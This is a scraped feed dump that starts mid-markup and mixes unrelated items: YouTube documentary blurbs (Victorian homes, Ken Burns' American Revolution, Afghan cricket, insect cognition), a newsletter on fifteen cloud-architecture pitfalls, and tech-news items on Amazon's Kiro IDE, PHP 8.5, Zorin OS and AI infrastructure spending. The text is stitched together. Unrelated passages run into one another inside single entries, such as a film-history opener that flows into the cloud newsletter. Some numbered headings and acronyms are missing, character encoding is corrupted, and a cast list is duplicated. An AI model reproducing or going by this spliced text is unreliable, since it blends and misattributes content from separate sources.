url="https://www.youtube.com/channel/UCc-N24Y5OA0gqbjBwe1ttfA">Weird History</source><content:encoded><![CDATA[Today on Weird history, we are going deep into the cinema history of 1988.

But this flexibility also means small mistakes can spread quickly. One incorrect setting, a missing tag policy, or a bad scaling rule can affect many environments at once. These issues can quickly become expensive or risky.Many teams run into “similar” problems… not because they’re careless, but because cloud platforms behave differently from traditional on-premise systems.This newsletter will walk you through 15 common pitfalls in cloud environments.The pitfall - quick example or patternWhy it happens - what design mistake causes itArchitectural impact - which parts of the system it affectHow to prevent it - ways to avoid itDesign systems that adapt to change instead of breaking under it… and build systems that stay reliable even when things go wrong.My favorite Black Friday deal is here!

(Valid until 6 December.)Orphaned resources are cloud assets that are no longer in use but continue to run.unattached storage disks,They pile up over time, cost “money”, and clutter dashboards… thus making it harder to track what’s important.A typical example is running a proof-of-concept on a large, expensive virtual machine and forgetting to shut it down or delete it. The VMs keep running, and the bill keeps growing until someone notices it.Cloud makes it easy to create new resources. But deleting them is usually a manual task—and people forget. As every resource has a cost, even tiny leftovers add up. If left untracked, nobody knows what can be safely removed.Orphaned resources make it hard to understand where money is going. They can also create security risks. For example:A forgotten test VM might still hold credentials.An old IP address might still be allowed in firewall rules.A leftover snapshot might contain sensitive data.Use tags: owner, purpose, and expiry date.Automate the cleanup of unused or expired resources.Send regular cost reports grouped by tags and resource age.Add cleanup to every project’s “done” checklist.Schedule automatic scans to find and remove old resources.Forgotten resources quietly waste money. While configuration mistakes break systems quickly.Misconfiguration is one of the most common causes of cloud incidents.A single wrong setting or missing rule can affect reliability, security, or cost. And its impact often spreads long before anyone notices.Encryption not turned on for storageA storage bucket accidentally left publicCopy-pasting templates without checking differencesWhen these patterns are automated, a single mistake amplifies across multiple accounts or regions.Cloud services offer hundreds of settings: permissions, scaling rules, encryption options, network controls, and so on.Teams often rely on defaults or copy settings between environments without reviewing them. When Infrastructure as Code () templates contain errors, those errors propagate every time the template is used.And fast release cycles make it worse; there’s rarely enough time for reviews.Expose sensitive services to the publicBecause cloud automation pushes changes at scale, a tiny error can impact an entire production environment within minutes.Keep configurations in version control; review and test every change.Use policy-as-code tools (Terraform Validate, AWS Config, Azure Policy).Detect configuration drift and automatically enforce compliance.Keep clear configuration baselines for production and non-production systems.Monitor continuously for anomalies or security alerts.Strong configurations are helpful, but they only work if teams communicate effectively. The next challenge isn’t in the code… it’s in coordination.3. Poor Communication Between TeamsCloud systems rely on effective coordination among development, operations, security, networking, and finance teams.If they don’t share information clearly, assumptions drift, ownership becomes unclear, and issues surface late in production.A networking team updates routing rules for compliance, but doesn’t inform data engineers who depend on that network.Pipelines fail the next day - not because of a bug, but because one team didn’t know what another had changed.Cloud projects involve many specialties:Developers focus on features.Operations focus on reliability.Security focuses on compliance.Each team uses different tools and has different priorities.If teams don’t share information clearly, critical details get lost. Teams may not know which workloads are important or how specific changes impact cost or performance.Poor communication causes:Inconsistent architecturePipelines that fail to integrateSecurity exceptions approved without full contextConflicting Identity and Access Management () rolesDuring incidents, no one is sure who owns what, which slows down the response and recovery.Define clear ownership and contact points for each system or account.Keep shared documentation and Architecture Decision Records ().Hold cross-team reviews for key infrastructure or cost changes.Encourage a “you build it, you run it” mindset.Use consistent tagging, naming, and shared communication channels (shared dashboards and so on).Communication gaps often cause teams to take shortcuts, such as relying on a single tool to solve every problem. But that approach can backfire!4. Believing One Tool Solves EverythingMany teams assume that a single cloud platform, monitoring tool, or automation system can handle every need.It feels efficient at first:One interface, one workflow, one place to learn.But as systems grow, this approach limits flexibility… and creates more problems than it solves.A team standardized on a single deployment tool that worked well for virtual machines (but didn’t support containers).And developers began writing custom scripts to fill the gaps, and environments drifted apart.So tracking changes became difficult.Cloud tools evolve fast, and many are marketed as “all-in-one” solutions.Teams under pressure to simplify or reduce costs often choose a single tool for everything: observability, CI/CD, security, deployments, and so on.At first, it seems easier to manage and train people on a single platform. But it becomes difficult over time:The tool doesn’t scale across many accounts.It doesn’t work well in hybrid or multi-cloud environments.It lacks the features needed for new services.What started as “simplicity” ends up as inflexibility.Relying on one tool can cause:Poor multi-cloud or hybrid supportLarge parts of the system break if the tool failsMissing metrics, especially for newer workloadsSlow innovation, as teams wait for features that may never arriveChoose tools based on fit, not just standardization.Review tool usage regularly as your architecture evolves.Design for interoperability using APIs and modular pipelines.Limit the number of tools you use. Also, group tools by purpose (monitoring, IaC, deployment). Plus, assign clear ownership.Relying just on one tool is risky. However, a deeper issue arises when there’s a lack of understanding about how the cloud actually works.Share this post & get rewards for the referrals.5. Weak Understanding of Cloud MechanicsMany cloud problems come from a lack of understanding of how the cloud actually works: from billing and scaling to data movement and networking.Without this knowledge, even well-designed systems can become expensive or unreliable.A team built a data analytics job that copied large datasets between regions daily.They assumed transfers were free, just like in their on-premise data center.Their first month’s bill showed network charges higher than the compute costs.Cloud platforms hide many infrastructure details.Although this makes things easier, it doesn’t remove responsibility. Teams used to traditional environments expect fixed costs and predictable performance.But in the cloud, everything is usage-based:How much data you processServices scale automatically, but not always as teams expect. There’s often a gap between how a service is described and how it behaves with real workloads.A weak understanding of cloud mechanics can cause:Systems that scale too slowly or too fastInefficient storage usage (e.g., active data on slow, cheap tiers)Silent cost growth in data transfer and API callsMisunderstanding reliability features like regional redundancy or eventual consistencyThese issues can cause high costs, data loss, or availability risks.Use cost calculators and load tests early.Build and test small prototypes before scaling up.Understand SLAs, scaling mechanisms, and regional data flows.Add platform training to onboarding and architecture reviews.Test how systems behave during failures or heavy load.Misunderstanding the platform often leads to copying old data-center patterns in the cloud. This could limit the benefits of using the cloud.6. Rebuilding On-Prem in the CloudA common and costly mistake is treating the cloud like a traditional data center.Many teams migrate their virtual machines, networks, and firewalls without changing the design. This feels safe and familiar. But it overlooks key cloud benefits, such as elasticity, automation, and managed services.A company copied its data-center VMs and networks directly into the cloud.Costs increased, updates remained manual, and scaling was limited.Only after moving to managed databases and autoscaling groups did the system become efficient.Most migrations happen under time pressure.Teams take the fastest route… and lift their on-premise environment into the cloud to avoid redesign work (“lift-and-shift” strategy).… continue, it brings technical debt into a platform that charges for every resource used by the unit (time/call/execution).Rebuilding on-premise in the cloud can cause:Poor use of managed servicesHigh costs from fixed-size infrastructureLimited scalability because of manual maintenanceWeak resilience compared to cloud-native designsOverreliance on network-based security instead of identity-based accessThese issues make systems harder to scale, more expensive to run, and slower to recover.Modernize step by step: start small and iterate slowly.Adopt cloud-native services where they reduce effort.Use identity and roles as the primary security boundary.Design for flexibility and modularity, so the system evolves.Run pilot projects to test scaling, recovery, and automation patterns.After moving to the cloud, structure and visibility become critical. Without proper governance, even small setups can turn chaotic.7. Missing Governance: No Tags, No Naming, No MonitoringWithout clear governance, even well-built cloud environments quickly become confusing.When resources have unclear names, lack tags, or are not monitored, costs increase and ownership becomes unclear.Teams can’t answer simple questions like:A company discovered that half of its monthly bill was because of untracked compute instances and unused storage.None had tags or meaningful names.It took weeks to trace the ownership. And only after adding tagging rules and cost dashboards could they safely remove the unnecessary resources.Early in the cloud adoption process, teams focus on speed rather than structure.They create resources fast, without standard tags or names. And as the environment grows across projects and regions, these missing details become a problem:Monitoring and cost alerts are added too lateNobody knows which VM supports productionOr which storage bucket belongs to a retired projectAs a result, the environment becomes difficult to understand.Missing governance leads to:Poor visibility and unclear ownershipSecurity teams unable to trace exposed resourcesFinance unable to link costs to owners or projectsUntracked resources piling up and wasting moneyAutomation tools failing because of missing tags and namesUse clear and consistent naming conventions.Treat governance as core architecture, not as cleanup work.Centralize monitoring, cost reporting, and alerting across all accounts.Use governance tools (AWS Config, Azure Policy, GCP Organization Policies).Define mandatory tagging standards: owner, environment, purpose, cost center, and expiry.Good governance improves visibility. But it doesn’t guarantee security, especially when teams rely too much on network boundaries and overlook identity and access controls.8. Treating Network as the Main Security LayerIn traditional data centers, the network perimeter is usually the primary line of defense:You could isolate systems, add firewalls, control traffic, and so on.But in the cloud, that model no longer works. Identity and permissions now define the real security boundary… yet many teams still rely mainly on network rules and overlook identity.A company isolated workloads in private subnets.But they gave broad permissions to their automation tools.When a CI/CD credential was compromised, attackers could access data directly through APIs.The network stayed closed, but identity access was enough to cause damage.Teams coming from on-premise environments often bring the same perimeter-based mindset into the cloud.This approach may work in small setups, but cloud environments are constantly evolving. Many services, such as serverless functions and managed databases, live outside fixed networks altogether.Relying too heavily on network controls causes:Strict rules blocking valid communicationMisconfigured firewalls exposing internal systemsNo protection against identity-based attacks (the most common breach type)Treat identity (IAM roles, service accounts, least-privilege policies) as the first layer of defense.Use network rules as an extra layer of protection, not as the core security layer.Apply zero-trust principles: verify every request based on identity and context, not location.Review access paths regularly and use automated policy validation tools.Prefer private endpoints and managed connectivity for sensitive services over custom VPNs.Solid security foundations are essential, but resilience also requires flexibility. Static designs fail… as soon as conditions change.9. Static Designs That Don’t Handle ChangeCloud systems are built to adapt:Services evolve, usage changes, and regions shift.But many teams design architectures as if nothing will ever change. Static, rigid designs may look stable at first… yet they fail the moment workloads, connections, or platform features change.An application launched with fixed VM clusters and manual scaling.During seasonal peaks, performance dropped sharply, so engineers had to add capacity manually.After switching to autoscaling (with limits) and serverless processing, the system automatically handled the load and “reduced costs” during quiet periods.Teams coming from on-premise environments often use a “set it and forget it” mindset. They keep the old patterns:Sometimes internal rules (long approval queues or fear of automation mistakes) also slow down change. The result is a system that works for current traffic but can’t grow with demand.Crashes during traffic spikesSlow recovery during incidentsWasted money during low trafficInfrastructure that becomes outdated as services evolveThey also discourage testing and experimentation.Design for elasticity: autoscaling, serverless, and event-driven models.Use infrastructure as code for flexible and repeatable deployments.Review the architecture regularly as usage and platform features evolve.Introduce chaos testing to validate how systems respond to failure.A system that can’t adapt is one problem. But even flexible systems waste money if development environments mirror production too closely.Share this post & get rewards for the referrals.10. Treating Development Like Production (Same Tiers, Policies, Permissions)Development and production should NOT look identical.When both environments use the same instance sizes, retention rules, and permissions, the result isn’t better control; it’s unnecessary cost and reduced flexibility.Development should be a safe environment for testing ideas… not a complete replica of the production environment.Every test stack used the same compute tiers, observability tools, and storage.A company cloned its entire production setup into development to “keep things consistent”.Within months, development costs reached almost half of the production costs.Teams often copy production settings into dev or test environments to avoid surprises. But in the cloud,Strict production policies… and identical configurations slow development, increase costs, and limit experimentation.Treating all environments the same leads to:Broad permissions exposing secretsHigh costs from expensive dev resourcesStrict rules blocking quick tests or experimentsA slow, rigid setup that adds little value between releasesUse smaller, cheaper instance types for non-production environments.Set different permission levels for development and production.Define separate budgets, data retention rules, and access policies.Use anonymized or synthetic data instead of production data.Tune monitoring and alerts for each environment’s purpose.Automate provisioning with clear parameters per environment (dev, test, prod).As environments grow, tracking costs across accounts becomes difficult. Without visibility, spending becomes hard to explain and control.Cloud costs become clear only when someone actually tracks them…Many teams run for months without knowing where their money is going. And this can quickly erode trust from finance and leadership.A project stored large datasets across many buckets.Without cost reports, nobody noticed that storage and data transfer costs were growing faster than compute.After adding tagging rules and cost dashboards, the team identified unused datasets and significantly reduced the monthly bill.Cloud billing provides detailed information but involves complexity.Costs spread across services, regions, and accounts. And without proper structure, it’s hard to understand who is spending what.If you prioritize speed without tracking costs, it creates “mystery spend”, where everyone assumes someone else is monitoring usage.Poor cost visibility leads to:Slow or stalled optimization effortsOver-provisioned or idle resources staying onlineDesign and scaling decisions disconnected from financial realityStorage and autoscaling choices that cost more than expectedTeams afraid to delete resources because the impact is unknownAssign clear cost ownership to teams.Tag resources by cost center, owner, and environment.Use built-in cost tools (AWS Cost Explorer, Azure Cost Management, GCP Billing Reports).Set budgets, forecasts, and anomaly alerts per project or account.Review cost data regularly in architecture and operations meetings.Add dashboards that show spend trends alongside performance metrics.Poor cost visibility often hides waste, and one common reason is collecting too much data.12. Collecting Too Much DataLogging and monitoring everything may seem like a safe approach.However, it often generates noise, increases costs, and makes real issues harder to identify. The problem isn’t collecting data; it’s collecting the “right data.One team enabled full request and response logging to debug an issue.But they forgot to turn it off.Within a month, logs grew to several terabytes, tripling monitoring costs and slowing searches.After adding retention limits and log sampling, they reduced data volume without losing visibility.Observability platforms make it easy to collect every log, metric, and trace. Without limits or retention rules, systems end up flooding themselves with low-value data. This leads to noise, high costs, and unmanageable dashboards.Uncontrolled data collection causes:High storage and monitoring costsCrowded dashboards and buried alertsSecurity and compliance risks from excessive log retentionTelemetry processing consuming bandwidth or computeApplication performance degradation in extreme casesSet different log levels and retention periods per environment.Use sampling and filtering for high-volume metrics or traces.Centralize logs, but enforce quotas and expiration policies.Use structured formats (JSON, key-value) to avoid repeating data.Review logging policies regularly and remove unnecessary sources.Compress or archive historical logs into cheaper storage tiers.Too much data often leads teams to automate aggressively in an effort to regain control. But without safeguards, it introduces a new set of risks.13. Automation Without SafeguardsAutomation brings speed and consistency to cloud operations.But without safety checks, it can also cause significant damage. The same script that deploys infrastructure efficiently can destroy it if misconfigured.One team scheduled a nightly cleanup script to remove idle dev resources.A small typo in the “dev” tag filter caused it to delete production resources instead.Adding dry-run checks and tighter permissions would have prevented the mistake.Teams automate provisioning, scaling, cleanup, and patching to save time… but under pressure, they often skip validation steps or safety controls.No dry-run or confirmation modeScripts running with admin-level permissionsBroad filters like “delete all unused resources”Once automated, these processes run fast, and errors can spread across accounts or regions before anyone notices.Unsafe automation can cause:Misconfigured infrastructureRecovery delays (automation outruns backups or rollbacks)Reduced trust in automation, pushing teams back to slow manual workAdd dry-run or confirmation modes before destructive actions.Limit permissions and filter by tag, environment, or resource ID.Test automation in sandbox accounts or with dummy data.Add approval steps to critical workflows.Log all automation actions and monitor for anomalies.Use version control and define clear rollback procedures.Automation speeds up workflows… but it can also mask growing costs associated with data transfer.14. Ignoring Data Transfer and Hidden CostsCloud data transfer may seem simple, but it often masks significant costs.Many teams underestimate how quickly network egress adds up. A small architectural choice can suddenly appear as a significant line item on the monthly bill.A company replicated video archives between regions every day for redundancy.Soon, the egress charges were higher than the cost of storing the entire dataset.Switching to regional redundancy and using a CDN dramatically reduced transfer costs.Cloud platforms make moving data easy… but NOT free.It’s often assumed that internal or inter-service traffic has no cost, just like in traditional networks. But every gigabyte (replication, cross-region backups, and analytics queries) leaving a region or zone adds to the bill.Ignoring data transfer leads to:Inefficient data placementScalability issues when traffic flows across regionsKeep compute and data in the same region.Understand pricing for inter-region, inter-zone, and external transfers.Use caching, CDNs, and data locality patterns to minimize data movement.Compress or deduplicate data before transferring it.Add data-flow and transfer-cost notes to architecture diagrams.Monitor egress with alerts in cost dashboards.Managing costs and transfers is one side of resilience… the other is recovery. Weak backup strategies often stay unnoticed until disaster strikes!Share this post & get rewards for the referrals.15. Weak Backup and Recovery StrategiesBackups can create a false sense of safety, especially when they’re never tested.It’s often assumed that, as cloud storage is durable, recovery is guaranteed. But recovery depends on correct setup, permissions, and validation… not just snapshots or replication.A company discovered during an audit that its encrypted backups couldn’t be restored.Encryption keys had been rotated months earlier.The data was intact but completely inaccessible.A backup you can’t restore is not helpful at all.Cloud platforms offer durability and automation, which leads to the assumption that backups “just work”. Some common issues that block restores:Missing or rotated encryption keysIncorrect IAM roles or expired credentialsAutomation overwriting or deleting snapshots without checksIn reality, recovery depends on configuration, identity, and timing. Without regular restore tests, you never know if recovery works as expected.Weak recovery strategies cause:Incomplete or corrupted backupsBackups stored in the wrong regionRetention-policy failures that break complianceRun regular restore drills and record the results.Test restores with rotated keys and in separate accounts.Store immutable, cross-region copies of critical datasets.Monitor backup success, size trends, and restore times.Define and track RTO (Recovery Time Objective) and RPO (Recovery Point Objective).Use separate permissions for backup management to prevent accidental deletion.All these pitfalls share a common lesson: The cloud is constantly evolving, and only flexible designs can keep up.Each pitfall explained in this newsletter comes from a misunderstanding…“Cloud is a static platform.”Instead, it’s a living system: constantly changing, adapting.Good cloud design accepts this reality and prepares for it. It uses automation safely, contains mistakes before they spread, and builds systems that fail gracefully.Architects can minimize damage by focusing on:Clarity over complexity: make ownership and purpose obvious to everyone.Automation with guardrails: automate checks and safety rules, not just deployments.Learning through testing: validate assumptions early and often so incidents don’t turn into surprises.Cloud reliability isn’t about preventing every error. It’s about preparing for them and designing systems that can survive change.👋 I’d like to thank  for writing this newsletter!Plus, don’t forget to check out her blog and socials:Also get a 50% discount for her ebook, “Mind the Gap: Most Common Cloud Mistakes”, on Gumroad when you use the code–SYSTEMDESIGN.

OpenAI has signed $1.4 trillion in infrastructure commitments, but how do they plan to pay for it? Are government subsidies and taxpayer-backed guarantees the next step? In this video, we dive into the financing gymnastics behind the AI revolution, the lobbying for federal support, and why tech firms are pitching AI as “too important to fail.”
We’ll cover:
✅ OpenAI’s $1.4 trillion data center buildout
✅ The push for government backstops and subsidies
✅ Nvidia’s warning on energy and capital constraints
✅ Why AI could strain power grids and utilities
✅ The risk of an AI “metabubble” and what it means for investors

"Instead of product diagrams or keynote slides, a crew from Seattle's Packrat creative studio used action figures on a miniature set to create a stop-motion sequence..." 


"Can the software development hero conquer the 'AI Slop Monster' to uncover the gleaming, fully functional robot buried beneath the coding chaos?"


Kiro (pronounced KEE-ro) is Amazon's effort to rethink how developers use AI. It's an integrated development environment that attempts to tame the wild world of vibe coding... But rather than simply generating code from prompts [in "vibe mode"], Kiro breaks down requests into formal specifications, design documents, and task lists [in "spec mode"]. This spec-driven development approach aims to solve a fundamental problem with vibe coding: AI can quickly generate prototypes, but without structure or documentation, that code becomes unmaintainable... 


The market for AI-powered development tools is booming. Gartner expects AI code assistants to become ubiquitous, forecasting that 90% of enterprise software engineers will use them by 2028, up from less than 14% in early 2024... Amazon launched Kiro in preview in July, to a strong response. Positive early reviews were tempered by frustration from users unable to gain access. Capacity constraints have since been resolved, and Amazon says more than 250,000 developers used Kiro in the first three months... 

Now, the company is taking Kiro out of preview into general availability, rolling out new features and opening the tool more broadly to development teams and companies... During the preview period, Kiro handled more than 300 million requests and processed trillions of tokens as developers explored its capabilities, according to stats provided by the company.
Rackspace used Kiro to complete what they estimated as 52 weeks of software modernization in three weeks, according to Amazon executives. SmugMug and Flickr are among other companies espousing the virtues of Kiro's spec-driven development approach. Early users are posting in glowing terms about the efficiencies they're seeing from adopting the tool... startups in most countries can apply for up to 100 free Pro+ seats for a year's worth of Kiro credits. 

Kiro offers property-based testing "to verify that generated code actually does what developers specified," according to the article — plus a checkpointing system that "lets developers roll back changes or retrace an agent's steps when an idea goes sideways..." 

"And yes, they've been using Kiro to build Kiro, which has allowed them to move much faster."]]></content:encoded></item><item><title>PHP 8.5 Brings Long-Awaited Pipe Operator, Adds New URI Tools</title><link>https://developers.slashdot.org/story/25/11/23/0021216/php-85-brings-long-awaited-pipe-operator-adds-new-uri-tools?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>EditorDavid</author><category>dev</category><category>slashdot</category><pubDate>Sun, 23 Nov 2025 01:35:00 +0000</pubDate><source url="https://developers.slashdot.org/">Dev - Slashdot - Dev</source><content:encoded><![CDATA["PHP 8.5 landed on Thursday with a long-awaited pipe operator and a new standards-compliant URI parser," reports the Register, "marking one of the scripting language's more substantial updates... "



The pipe operator allows function calls to be chained together, which avoids the
extraneous variables and nested statements that might otherwise be
involved. Pipes tend to make code more readable than other ways to
implement serial operations. Anyone familiar with the Unix/Linux
command line or programming languages like R,
F#,
Clojure, or
Elixir
may have used the pipe operator. In JavaScript, aka ECMAScript, a
pipe operator has been proposed, though there are alternatives
like method chaining.
 

Another significant addition is the URI
extension, which allows developers to parse and modify URIs and
URLs based on both the RFC 3986 and the WHATWG URL standards. Parsing
with URIs and URLs â" reading them and breaking them down into their
different parts â" is a rather common task for web-oriented
applications. Yet prior versions of PHP didn't include a
standards-compliant parser in the standard library. As noted
by software developer Tim DÃ¼sterhus, the parse_url()
function that dates back to PHP 4 doesn't follow any standard and
comes with a warning that it should not be used with untrusted or
malformed URLs.

 Other noteworthy additions to the language include: Clone
With, for updating properties more efficiently; the #[\NoDiscard] attribute, for warning when a return value goes unused; the
ability to use static closures and first-class callables in constant expressions; and persistent cURL handles that can be shared across multiple PHP requests.]]></content:encoded></item><item><title>Sex, Drugs, Disease: The Scandalous Secrets Of The Victorian Home</title><link>https://www.youtube.com/watch?v=rtoz8HEPCy4</link><author>Timeline - World History Documentaries</author><category>yt</category><enclosure url="https://www.youtube.com/v/rtoz8HEPCy4?version=3" length="" type=""/><pubDate>Sat, 22 Nov 2025 22:01:02 +0000</pubDate><source url="https://www.youtube.com/channel/UC88lvyJe7aHZmcvzvubDFRg">Timeline - World History Documentaries</source><content:encoded><![CDATA[This documentary explores the contrast between the idealized image of the Victorian family home and the darker, often scandalous realities hidden within. It dives into the themes of morality, gender roles, disease, illicit sex, and the societal pressures depicted in Victorian art. The Victorian era presented the world with an image of domestic bliss and moral rectitude - the 'Home Sweet Home' myth. This documentary shatters that facade, exploring the hidden realities of 19th-century Britain. From the strict, prison-like confines of the family home for women to the dark secrets of adultery, prostitution, and terrifying epidemics like syphilis and scarlet fever, we uncover the moral hypocrisy that gripped society. Featuring rare access to Victorian anatomical models and shocking true crime stories, this is the complex, dark history behind the respectable image.

And one month later, Zorin OS developers now claim that 780,000 people downloaded it from a Windows computer in the space of a month, according to the tech news site XDA Developers.



In a post on the Zorin blog, the developers of the operating system Zorin OS 18 announced that they've managed to accrue one million downloads of the operating system in a single month [since its launch on October 14]. While this is plenty impressive by itself, the developers go on to reveal that, out of that million, 78% of the downloads came from a Windows machine. That means that at least 780,000 people on Windows gave Zorin OS 18 a download... 

[I]t's easy to see why: the developers put a heavy emphasis on making their system the perfect home for ex-Windows users.

The unlikely journey has brought hope to a country with rare reason to celebrate while illuminating the complex politics of the Taliban's relationship to cricket.

Cricket has grown into a vital part of life in Afghanistan - offering glimmers of joy and excitement to the countless Afghans that play and watch the game. And while the stunning achievements of the men's national team have fostered unity and hope, the Taliban's return to power means half of the country is barred from the festivities and many female players were forced to flee their homeland. 

In a crisis-ridden country like Afghanistan, cricketing success is both deeply meaningful to its people and a complex political challenge, presenting the Taliban government with an opportunity to use the sport at home and abroad. Cricket has offered star players like Gulbadin Naib a path from childhood refugee camps to international acclaim, while all over the country young players like Jamal Stanikzai dream of one day taking part in the team's success. For Afghan refugees like former women's national team player Firooza Amiri, cricket is both a beloved sport and a form of resistance. Deutsche Welle accompanies current and former players and fans in Afghanistan, Australia and Dubai to tell the intertwined stories of Afghan cricket.

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L.

Neil deGrasse Tyson, Chuck Nice, Gary O’Reilly, and astrophysicist Charles Liu explore force fields, warp drive, invisibility, and quantum physics behind superhero powers. 

If Superman swoops in to catch a falling Lois Lane, wouldn’t she hit him like a bug on a windshield? Could his physiology, including his digestive system be super too? And what would happen if Superman’s methane-packed farts met his heat vision? The gang imagines a literal human flamethrower. How can Superman see colors with x-ray vision? 
Neil recalls DC Comics once asking him to help Superman find Krypton in the night sky, raising questions about how long it took Superman to get here. Could he have traveled through a wormhole? Or warped spacetime like the Enterprise? Charles explains why folding space might be harder than warping ourselves, and how Miguel Alcubierre’s warp bubble could one day make sci-fi travel real.

We break down the science of invisibility. What would it mean to be truly unseen? The crew explores stealth technology, light-bending metamaterials, and quantum invisibility. Learn about invisible forces, like the Casimir effect and how quantum fluctuations affect our world. We break down how the Flash can walk through walls. If atoms are mostly empty space why aren’t we falling through the floor? 

Learn about quantum teleportation, and whether we can use entanglement for quantum communication. We dive into the quantum realm itself with the fictional Pym particles, Dr. Manhattan’s wave function, and the many-worlds theory that spawns infinite universes every second. Neil wonders if that’s a scientific breakthrough or a cosmic cop-out. Charles closes with wisdom: as our knowledge grows, so does the perimeter of our ignorance. In a universe where every possibility happens somewhere, God doesn’t just play dice—He plays all of them at once.

For a long time, scientists believed insects acted mostly out of instinct and weren’t particularly intelligent, in part, because most of them only live for a few weeks. But it turns out, the insect world is far more complex than we previously thought.  

Many insect species have brains the size of a grain of rice, but are still able to store images, shapes, colors and experiences, and can even learn new skills and work with tools.  

In many species, individual insects even develop unique traits and personalities, like bravery or aggressiveness. One reason for this could be that species with diverse individuals can better adapt to environmental changes, giving them an evolutionary advantage for survival.

The comments show a rare look at what Google executives are telling its own employees internally. Vahdat, a vice president at Google Cloud, presented slides to its employees showing the company needs to scale “the next 1000x in 4-5 years.”While a thousandfold increase in compute capacity sounds ambitious by itself, Vahdat noted some key constraints: Google needs to be able to deliver this increase in capability, compute, and storage networking “for essentially the same cost and increasingly, the same power, the same energy level,” he told employees during the meeting. “It won’t be easy but through collaboration and co-design, we’re going to get there.”]]></content:encoded></item><item><title>When Picasso Painted Stalin</title><link>https://www.youtube.com/watch?v=KaoCLIWPthc</link><author>Shawn Grenier | The Canvas</author><category>yt</category><enclosure url="https://www.youtube.com/v/KaoCLIWPthc?version=3" length="" type=""/><pubDate>Fri, 21 Nov 2025 20:03:24 +0000</pubDate><source url="https://www.youtube.com/channel/UCqTHx0ObkFZ97KO2SWUuz9w">Shawn Grenier | The Canvas</source><content:encoded><![CDATA[When Picasso drew Stalin for Les Lettres Francaises, it sparked a controversy.

To modern eyes, Hunters in the Snow might evoke a picture-perfect winter’s day, full of charm and nostalgia that is both familiar and influential, but for Bruegel and his contemporaries, winter was not picturesque, it was harsh, dangerous, and often deadly.

In that sense, the painting’s beauty is inseparable from its melancholy. It is not a ‘celebration’ of winter but a recognition of it, an honest, empathetic portrayal of human beings enduring and coexisting with the overwhelming force of nature. 

It is that bittersweet tension, that makes Hunters in the snow, such an emotive and timeless image.

THE AMERICAN REVOLUTION | A Film By Ken Burns, Sarah Botstein and David Schmidt
An expansive look at the virtues and contradictions of the war and the birth of the United States of America, the film follows dozens of figures from a wide variety of backgrounds. Through their individual stories, viewers experience the war through the memories of the men and women who experienced it: the rank-and-file Continental soldiers and American militiamen (some of them teenagers), Patriot political and military leaders, British Army officers, American Loyalists, Native soldiers and civilians, enslaved and free African Americans, German soldiers in the British service, French and Spanish allies, and various civilians living in North America, Loyalist as well as Patriot, including many made refugees by the war.

The Revolution began a movement for people around the world to imagine new and better futures for themselves, their nations, and for humanity. It declared American independence with promises that we continue to strive for. The American Revolution opened the door to advance civil liberties and human rights, and it asked questions that we are still trying to answer today.

The film, narrated by Peter Coyote, includes the first-person voices of nearly 200 individual historic figures, read by a cast of actors, including Adam Arkin, Jeremiah Bitsui, Corbin Bleu, Kenneth Branagh, Josh Brolin, Bill Camp, Tantoo Cardinal, Josh Charles, Hugh Dancy, Claire Danes, Jeff Daniels, Keith David, Hope Davis, Marcus Davis-Orrom, Bruce Davison, Leon Dische Becker, Alden Ehrenreich, Craig Ferguson, Morgan Freeman, Christian Friedel, Paul Giamatti, Domhnall Gleeson, Amanda Gorman, Michael Greyeyes, Jonathan Groff, Charlotte Hacke, Tom Hanks, Ethan Hawke, Maya Hawke, Lucas Hedges, Josh Hutcherson, Samuel L. Jackson, Gene Jones, Michael Keaton, Joe Keery, Joel Kinnaman, Tracy Letts, Damian Lewis, Laura Linney, Josh Lucas, Michael Mando, Carolyn McCormick, Lindsay Mendez, Tobias Menzies, Joe Morton, Edward Norton, David Oyelowo, Mandy Patinkin, Wendell Pierce, Jon Proudstar, Matthew Rhys, LaTanya Richardson, Liev Schreiber, Chaske Spencer, Dan Stevens, Meryl Streep, and Yul Vazquez, among others.]]></content:encoded></item><item><title>Why the US is almost always at war? | DW Documentary</title><link>https://www.youtube.com/watch?v=pUmpxBLMQKg</link><author>DW Documentary</author><category>yt</category><enclosure url="https://www.youtube.com/v/pUmpxBLMQKg?version=3" length="" type=""/><pubDate>Fri, 21 Nov 2025 17:01:24 +0000</pubDate><source url="https://www.youtube.com/channel/UCW39zufHfsuGgpLviKh297Q">DW Documentary</source><content:encoded><![CDATA[Throughout its 250-year existence, the United States has almost always been at war. From its beginnings right through to the present day, the country's armed forces have shaped both American identity and the political decisions of its leaders.

The United States of America has been at war throughout most of its 250-year existence. From the War of Independence right through to contemporary armed conflicts, the nation's armed forces have not only shaped American identity but also influenced the political decisions of its leaders.
The documentary takes a deep dive into this complex history and analyzes the "hot" and "cold" wars that have shaped US history in order to draw important lessons for the future.

The film explores how successive generations of US Americans viewed and experienced each conflict. It also examines the enduring impact of these wars on American society and reveals how military engagement was utilized to hone the image and the role of the US on the global stage.
Around 30 high-profile experts, military personnel and politicians examine the military history of the United States, explaining its successes and failures, as well as its impact on the world and the everyday lives of Americans.

The film looks to the past to gain a keener understanding of how today's military decisions will affect tomorrow's world — as well as their far-reaching impact on democracy and society. And with US President Donald Trump now in office for a second term, it asks what role the army plays in Trump's world view.

